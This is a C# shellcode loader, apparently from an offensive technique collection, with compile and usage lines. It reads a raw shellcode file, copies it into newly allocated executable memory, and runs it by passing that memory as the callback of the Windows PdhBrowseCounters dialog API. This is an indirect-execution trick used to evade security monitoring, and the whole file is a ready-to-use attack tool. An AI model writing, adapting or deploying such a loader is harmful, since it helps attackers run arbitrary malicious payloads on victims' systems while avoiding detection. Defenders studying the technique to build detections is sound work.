// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PdhBrowseCounters
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: PdhBrowseCounters.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);


            PDH_BROWSE_DLG_CONFIG sBDC = new PDH_BROWSE_DLG_CONFIG();
            sBDC.pCallBack = hAlloc;

            PdhBrowseCounters(ref sBDC);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Pdh.dll")]
        static extern bool PdhBrowseCounters(ref PDH_BROWSE_DLG_CONFIG pBrowseDlgData);

        //Modified struct from https://github.com/dahall/Vanara/blob/3e1596ba7f60f6478e9efd0d5c1b30d102df9439/PInvoke/Pdh/Pdh.cs
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
		public struct PDH_BROWSE_DLG_CONFIG
		{
			public BrowseFlag Flags;
			public IntPtr hWndOwner;
			[MarshalAs(UnmanagedType.LPTStr)] 
            public string szDataSource;
			public IntPtr szReturnPathBuffer;
			public uint cchReturnPathLength;
			public IntPtr pCallBack;
			public IntPtr dwCallBackArg;
			public uint CallBackStatus;
			public uint dwDefaultDetailLevel;

			[MarshalAs(UnmanagedType.LPTStr)] 
            public string szDialogBoxCaption;
			public IntPtr CounterPaths;
		}


        //https://github.com/dahall/Vanara/blob/3e1596ba7f60f6478e9efd0d5c1b30d102df9439/PInvoke/Pdh/Pdh.cs
        [Flags]
		public enum BrowseFlag
		{
			bIncludeInstanceIndex = 1 << 0,
			bSingleCounterPerAdd = 1 << 1,
			bSingleCounterPerDialog = 1 << 2,
			bLocalCountersOnly = 1 << 3,
			bWildCardInstances = 1 << 4,
			bHideDetailBox = 1 << 5,
			bInitializePath = 1 << 6,
			bDisableMachineSelection = 1 << 7,
			bIncludeCostlyObjects = 1 << 8,
			bShowObjectBrowser = 1 << 9,
		}
	}
}
